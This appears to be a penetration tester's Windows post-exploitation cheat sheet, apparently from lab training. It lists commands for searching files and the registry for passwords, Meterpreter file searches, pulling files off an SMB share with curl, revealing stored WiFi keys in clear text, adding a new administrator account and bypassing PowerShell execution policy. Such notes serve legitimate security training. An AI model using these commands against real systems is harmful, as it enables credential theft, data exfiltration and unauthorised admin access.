## Enumeration is the key

- https://www.thehackr.com/windows-cmd-cheat-sheet/
- https://sirensecurity.io/blog/windows-privilege-escalation-resources/

What you gonna do?

IIS Server logs path:

```text
C:\WINDOWS\system32\Logfiles\
```

Searching for installed images and software:

```text
dism /online /Get-Features
dism /online /Get-Features /format:table
```

Search filesystem for files containing keywords:

```bash
dir /s *pass* == *cred* == *vnc* == *.config*
```

Find password in certain file types:

```bash
findstr /si password *.xml *.ini *.txt 
reg query HKLM\SOFTWARE
```


Searching with Meterpreter: 

```bash
meterpreter > search -d c:\\documents\ and\ settings\\administrator\\desktop\\ -f *.pdf
Found 2 results...
    c:\documents and settings\administrator\desktop\operations_plan.pdf (244066 bytes)
    c:\documents and settings\administrator\desktop\budget.pdf (244066 bytes)
meterpreter >
```

```bash
meterpreter > search -f *.jpg
Found 418 results...
...snip...
    c:\Documents and Settings\All Users\Documents\My Pictures\Sample Pictures\Blue hills.jpg (28521 bytes)
    c:\Documents and Settings\All Users\Documents\My Pictures\Sample Pictures\Sunset.jpg (71189 bytes)
    c:\Documents and Settings\All Users\Documents\My Pictures\Sample Pictures\Water lilies.jpg (83794 bytes)
    c:\Documents and Settings\All Users\Documents\My Pictures\Sample Pictures\Winter.jpg (105542 bytes)
...snip...
```

Restarting the IIS server:
```shell
c:/> iisreset /stop
c:/> iisreset /start
```

Finding all executable files on the system:

```shell
C:\WINDOWS\system32>where /F /T *.exe
```

Excluding results from the listing:

```shell
C:\WINDOWS\system32\inetsrv>dir |findstr /V dll
```

Exfiltrating files from the SMB service:

```bash
curl --url smb://hacker:hacker@10.11.1.31/C$/WINDOWS/system32/inetsrv/MBSchema.xml -o MBSchema.xml
```


Finding a file:
```shell
dir *bob*.* /s
dir *.xls /s
```

Listing all services:
```shell
sc QUERY state= all
```

Listing all processes with their command-line arguments:
```shell
WMIC path win32_process get Caption,Processid,Commandline
WMIC path win32_process get Caption,Processid,Commandline /value |findstr "="
```

Running commands as another user:

- http://stackoverflow.com/questions/12903629/ddg#12903698

```shell
runas /noprofile /user:Administrator cmd
```

Querying registers' information:

```shell
reg query HKLM\SOFTWARE\Microsoft\
```

WiFi password recovering:

```shell
netsh wlan show profiles 
netsh wlan show profile name=<profile> key=clear
```

Adding a new user:

```shell
net user NewAdmin SuperDuperPass1 /add
```

Adding a user to the group:

```shell
net localgroup "administrators" NewAdmin /add
```

Running powershell script:

```shell
powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File file.ps1
```

Listing the group members:

```shell
net localgroup "administrators"

net localgroup

net user Administrator

whoami /groups
```


Reading a file:

```shell
more proof.txt
```

Stoping and starting services:

```shell
net stop slmail
net start slmail
```

Checking file permissions:
```shell
> cacls Music
F:\Users\Mantas\Music SNOW\grawity:F
                      CREATOR OWNER:(OI)(CI)(IO)F
                      SNOW\grawity:(OI)(CI)(IO)F
                      NT AUTHORITY\SYSTEM:(OI)(CI)F
```

Checking file's ownership:

```shell
> dir /Q
```

List running services:

```shell
C:\Windows\system32> tasklist /SVC
```

Checking the service's status:

```shell
C:\Users\user1\Desktop> sc qc IKEEXT
[SC] QueryServiceConfig SUCCESS
SERVICE_NAME: IKEEXT
        TYPE               : 20  WIN32_SHARE_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Windows\system32\svchost.exe -k netsvcs
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : IKE and AuthIP IPsec Keying Modules
        DEPENDENCIES       : BFE
        SERVICE_START_NAME : LocalSystem

```